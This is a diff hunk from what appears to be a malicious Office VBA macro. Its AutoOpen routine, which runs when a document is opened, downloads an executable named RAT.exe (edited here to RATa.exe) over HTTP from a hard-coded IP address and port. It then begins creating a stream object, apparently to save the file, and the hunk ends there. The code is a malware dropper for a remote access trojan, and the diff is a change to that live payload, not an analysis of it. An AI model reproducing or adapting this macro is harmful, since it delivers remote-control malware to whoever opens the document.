@@ -24,7 +24,7 @@ Sub AutoOpen()
 
     Dim objHTTP As Object
     Set objHTTP = CreateObject("MSXML2.XMLHTTP")
-    objHTTP.Open "GET", "http://192.168.92.136:8080/RAT.exe", False
+    objHTTP.Open "GET", "http://192.168.92.136:8080/RATa.exe", False
     objHTTP.Send
 
     Dim objStream As Object
